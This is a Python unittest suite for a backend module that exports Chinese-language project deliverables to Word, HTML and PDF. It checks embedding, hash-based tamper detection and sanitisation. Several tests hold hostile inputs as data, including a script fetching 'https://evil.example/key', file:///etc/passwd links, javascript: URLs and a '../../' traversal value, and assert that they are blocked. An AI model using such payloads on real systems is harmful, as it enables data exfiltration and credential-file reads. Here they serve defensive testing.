import io
import base64
import re
import shutil
import subprocess
import tempfile
import unittest
import uuid
import zipfile
from pathlib import Path
from unittest.mock import patch

from docx import Document
from fastapi import HTTPException
from PIL import Image
from pypdf import PdfReader

from backend import delivery_media
from backend.document_exports import (prepare_document, html_document, docx_document,
                                      render_document, document_capabilities)


class DocumentExportTests(unittest.IsolatedAsyncioTestCase):
    def setUp(self):
        self.directory = tempfile.TemporaryDirectory()
        self.store = delivery_media.DeliveryMediaStore(Path(self.directory.name).resolve() / 'media')
        self.patch = patch.object(delivery_media, 'store', self.store)
        self.patch.start()
        self.job = {'id': str(uuid.uuid4()), 'project_id': None, 'mode': 'group', 'status': 'complete',
                    'result': {'delivery': {'title': '项目协作成果', 'status': 'complete',
                     'content': '# 正文标题\n\n这是**中文结果**，包含 *斜体* 和 `print(x)`。\n\n'
                                '## 实施步骤\n\n1. 分配任务\n2. 验证交付\n\n'
                                '> 用户要求保留来源。\n\n'
                                '| 角色 | 结果 |\n| --- | --- |\n| 研究员 | 有依据 |\n| 作者 | 完整正文 |\n\n'
                                '[资料来源](https://example.org/research)\n', 'media': []}}}

    def tearDown(self):
        self.patch.stop()
        self.directory.cleanup()

    def image(self, kind='PNG'):
        buffer = io.BytesIO()
        Image.new('RGB', (320, 160), 'skyblue').save(buffer, format=kind)
        entry = self.store.save_bytes(self.job, buffer.getvalue(), kind='image', provider='test', caption='真实图片')
        self.job['result']['delivery']['media'].append(entry)
        return entry

    def source(self):
        return prepare_document(self.job, 'group:delivery')

    def test_editable_word_retains_chinese_headings_tables_and_sources(self):
        document = Document(io.BytesIO(docx_document(self.source())))
        paragraphs = '\n'.join(p.text for p in document.paragraphs)
        self.assertIn('这是中文结果', paragraphs)
        self.assertIn('2. 验证交付', paragraphs)
        self.assertIn(self.job['id'], paragraphs)
        self.assertEqual(len(document.tables), 1)
        self.assertEqual(document.tables[0].cell(1, 1).text, '有依据')
        self.assertIn('https://example.org/research', [rel.target_ref for rel in document.part.rels.values() if rel.is_external])
        self.assertTrue(any(run.bold and run.text == '中文结果' for para in document.paragraphs for run in para.runs))
        self.assertIn('Arial Unicode MS', document.styles.element.xml)

    def test_embeds_verified_images_at_original_position_and_appends_unused(self):
        entry = self.image()
        unused = self.image('WEBP')
        self.job['result']['delivery']['content'] = f'前文\n\n![关键画面]({entry["url"]})\n\n后文'
        source = self.source()
        markup = html_document(source).decode()
        self.assertEqual(markup.count('src="data:image/'), 2)
        self.assertLess(markup.index('前文'), markup.index('src="data:'))
        self.assertLess(markup.index('src="data:'), markup.index('后文'))
        self.assertNotIn('/api/media/', markup)
        document = Document(io.BytesIO(docx_document(source)))
        self.assertEqual(len(document.inline_shapes), 2)
        self.assertEqual(document.inline_shapes[0]._inline.docPr.get('descr'), '关键画面')
        with zipfile.ZipFile(io.BytesIO(docx_document(source))) as z:
            self.assertTrue(all(path.endswith('.png') for path in z.namelist() if path.startswith('word/media/')))

    def test_external_html_and_image_urls_never_executed_or_fetched(self):
        self.job['result']['delivery']['content'] = ('正常段落\n\n<script>fetch("https://evil.example/key")</script>\n'
            '![外部图](https://evil.example/a.png)\n\n![本地文件](file:///etc/passwd)\n'
            '[bad](javascript:alert(1)) [local](file:///secret) [safe](https://example.org)')
        source = self.source()
        markup = html_document(source).decode()
        self.assertNotIn('<script>', markup)
        self.assertNotIn('src="https:', markup)
        self.assertNotIn('href="file:', markup)
        self.assertNotIn('href="javascript:', markup)
        self.assertIn('default-src', markup)
        self.assertIn('图片未嵌入', markup)
        self.assertEqual(len(source.warnings), 1)  # CommonMark rejects file: images itself.
        document = Document(io.BytesIO(docx_document(source)))
        self.assertFalse(any(r.target_ref.startswith(('file:', 'javascript:')) for r in document.part.rels.values() if r.is_external))

    def test_hash_mismatch_and_foreign_media_fail_closed(self):
        entry = self.image()
        self.job['result']['delivery']['media'][0]['sha256'] = 'f' * 64
        with self.assertRaises(HTTPException) as error:
            self.source()
        self.assertEqual(error.exception.status_code, 409)
        self.job['result']['delivery']['media'][0]['sha256'] = entry['sha256']
        self.job['project_id'] = str(uuid.uuid4())
        with self.assertRaises(HTTPException): self.source()

    @unittest.skipUnless(shutil.which('ffmpeg') and shutil.which('ffprobe'), 'ffmpeg is optional')
    async def test_html_embeds_exact_verified_video_and_print_exports_keep_explanation(self):
        path = Path(self.directory.name) / 'video.mp4'
        subprocess.run([shutil.which('ffmpeg'), '-v', 'error', '-f', 'lavfi', '-i',
                        'testsrc2=s=160x120:r=10:d=1', '-c:v', 'libx264', str(path)], check=True)
        raw = path.read_bytes()
        entry = self.store.save_bytes(self.job, raw, kind='video', provider='fixture', caption='离线播放')
        self.job['result']['delivery'].update(media=[entry], content=f'[打开视频]({entry["url"]})\n\n真实作品说明')
        result = await render_document(self.job, 'group:delivery', 'html')
        markup = result['content'].decode()
        encoded = re.findall(r'<video[^>]*src="data:video/mp4;base64,([^"]+)"', markup)
        self.assertEqual(len(encoded), 1)
        self.assertEqual(base64.b64decode(encoded[0]), raw)
        self.assertIn('href="#video-' + entry['id'] + '"', markup)
        self.assertIn('media-src data:', markup)
        self.assertNotIn('/api/media/', markup)
        self.assertFalse(result['warnings'])
        printed = self.source()
        self.assertFalse(printed.videos)
        self.assertTrue(any('视频不嵌入' in warning for warning in printed.warnings))
        self.job['result']['delivery']['media'][0] = {**entry, 'sha256': 'f' * 64}
        with self.assertRaises(HTTPException):
            await render_document(self.job, 'group:delivery', 'html')

    def test_tampered_actual_image_file_fails_closed(self):
        entry = self.image()
        path = self.store.directory / self.job['id'] / entry['id'] / entry['name']
        path.write_bytes(b'changed')
        with self.assertRaises(HTTPException): self.source()

    def test_old_reused_links_map_only_from_hash_bound_receipts(self):
        entry = self.image()
        original_job, original_id = str(uuid.uuid4()), str(uuid.uuid4())
        entry['slot_id'] = 'reused-' + original_id
        entry['source_task_id'] = original_job
        # Save the trusted provenance in the store manifest as the real reuse path does.
        manifest = self.store.directory / self.job['id'] / entry['id'] / 'manifest.json'
        import json
        manifest.write_text(json.dumps(entry))
        older_job, older_id = str(uuid.uuid4()), str(uuid.uuid4())
        self.job['result']['delivery']['media_reuse_origins'] = [{'asset_id': entry['id'], 'source_asset_id': older_id, 'source_job_id': older_job, 'sha256': entry['sha256']}]
        self.job['result']['delivery']['content'] = f'![历史图](/api/media/jobs/{older_job}/assets/{older_id}/content)'
        markup = html_document(self.source()).decode()
        self.assertIn('alt="历史图" src="data:', markup)
        self.job['result']['delivery']['media_reuse_origins'][0]['sha256'] = 'f' * 64
        self.assertIn('图片未嵌入', html_document(self.source()).decode())

    def test_partial_exports_cannot_claim_completion(self):
        self.job['result']['delivery'].update(status='partial', limitations=['缺少第二张图片'])
        source = self.source()
        self.assertIn('部分输出', html_document(source).decode())
        self.assertIn('缺少第二张图片', html_document(source).decode())
        paragraphs = '\n'.join(p.text for p in Document(io.BytesIO(docx_document(source))).paragraphs)
        self.assertIn('部分输出', paragraphs)
        self.assertIn('缺少第二张图片', paragraphs)

    def test_code_is_literal_and_not_interpreted(self):
        self.job = {'id': str(uuid.uuid4()), 'mode': 'sdk_script', 'status': 'complete', 'result': {'answer': '<html><script>alert(1)</script></html>'}}
        markup = html_document(prepare_document(self.job, 'sdk:answer')).decode()
        self.assertIn('&lt;script&gt;', markup)
        self.assertNotIn('<script>', markup)

    def test_selected_message_does_not_export_all_delivery_assets(self):
        self.image()
        self.job['result']['messages'] = [{'member_id': 'writer', 'content': '单条发言'}]
        source = prepare_document(self.job, 'group:0')
        self.assertFalse(source.images)
        self.assertNotIn('正文标题', source.content)

    def test_long_text_is_not_truncated_and_layout_affects_margins(self):
        content = '始端标志\n\n' + ('这是需要完整交付的正文。\n\n' * 700) + '结束标志'
        self.job['result']['delivery']['content'] = content
        source = self.source()
        for layout in ('report', 'article', 'compact'):
            document = Document(io.BytesIO(docx_document(source, layout)))
            paragraphs = '\n'.join(p.text for p in document.paragraphs)
            self.assertIn('结束标志', paragraphs)
            self.assertEqual(paragraphs.count('这是需要完整交付的正文'), 700)
        report = Document(io.BytesIO(docx_document(source, 'report')))
        compact = Document(io.BytesIO(docx_document(source, 'compact')))
        self.assertGreater(report.sections[0].left_margin, compact.sections[0].left_margin)

    async def test_export_contract_and_rejected_formats(self):
        for kind in ('docx', 'html'):
            result = await render_document(self.job, 'group:delivery', kind, 'article')
            self.assertGreater(len(result['content']), 500)
            self.assertEqual(len(result['sha256']), 64)
            self.assertEqual(len(result['source_sha256']), 64)
            self.assertTrue(result['filename'].endswith('.' + kind))
        for kind, layout in [('exe', 'report'), ('html', '../../')]:
            with self.assertRaises(HTTPException):
                await render_document(self.job, 'group:delivery', kind, layout)

    async def test_digest_identifies_original_source_even_when_code_is_quoted(self):
        import hashlib
        self.job = {'id': str(uuid.uuid4()), 'mode': 'sdk_script', 'status': 'complete',
                    'result': {'answer': '<html><script>alert(1)</script></html>'}}
        result = await render_document(self.job, 'sdk:answer', 'html')
        self.assertEqual(result['source_sha256'], hashlib.sha256(self.job['result']['answer'].encode()).hexdigest())

    async def test_duplicate_opening_title_is_removed_only_from_presentation(self):
        import hashlib
        content = "# **项目协作成果**\n\n正文保留。\n\n## 结论\n\n后文保留。"
        self.job['result']['delivery']['content'] = content
        source = self.source()
        self.assertEqual(source.content, content)
        self.assertEqual(source.source_sha256, hashlib.sha256(content.encode()).hexdigest())
        markup = html_document(source).decode()
        self.assertEqual(markup.count('<h1>'), 1)
        self.assertIn('<h2>结论</h2>', markup)
        document = Document(io.BytesIO(docx_document(source)))
        self.assertEqual(sum(p.text == '项目协作成果' for p in document.paragraphs), 1)
        self.assertIn('结论', [p.text for p in document.paragraphs])
        if next(item['available'] for item in (await document_capabilities())['formats'] if item['id'] == 'pdf'):
            result = await render_document(self.job, 'group:delivery', 'pdf')
            text = '\n'.join(p.extract_text() for p in PdfReader(io.BytesIO(result['content'])).pages)
            self.assertEqual(text.count('项目协作成果'), 1)
            self.assertIn('后文保留', text)

    def test_title_deduplication_normalizes_spacing_but_preserves_other_headings(self):
        delivery = self.job['result']['delivery']
        delivery.update(title='Project Report', content='# Project　Report\n\nText')
        self.assertEqual(html_document(self.source()).decode().count('<h1>'), 1)
        for content in ('# Other title\n\nText', 'Introduction\n\n# Project Report', '# [Project Report](https://example.org/source)'):
            delivery['content'] = content
            self.assertEqual(html_document(self.source()).decode().count('<h1>'), 2)
        delivery['content'] = '# Project Report\n\n# Project Report'
        self.assertEqual(html_document(self.source()).decode().count('<h1>'), 2)

    def test_invalid_control_characters_are_an_explicit_export_error(self):
        self.job['result']['delivery']['content'] = 'valid' + chr(0) + 'invalid'
        with self.assertRaises(HTTPException) as error:
            self.source()
        self.assertEqual(error.exception.status_code, 422)

    async def test_real_pdf_contains_cjk_table_image_and_multiple_pages(self):
        capabilities = await document_capabilities()
        if not next(item['available'] for item in capabilities['formats'] if item['id'] == 'pdf'):
            self.skipTest('Chromium must be installed for actual PDF rendering')
        entry = self.image()
        self.job['result']['delivery']['content'] += f'\n![配图]({entry["url"]})\n\n' + ('中文分页验收，保留段落与来源。\n\n' * 70) + '最终结束标志'
        result = await render_document(self.job, 'group:delivery', 'pdf', 'report')
        pdf = PdfReader(io.BytesIO(result['content']))
        text = '\n'.join(page.extract_text() for page in pdf.pages)
        self.assertGreaterEqual(result['pages'], 3)
        self.assertIn('项目协作成果', text)
        self.assertIn('最终结束标志', text)
        self.assertIn('研究员', text)
        self.assertGreater(sum(len(page.images) for page in pdf.pages), 0)
        self.assertEqual(text.count('中文分页验收'), 70)
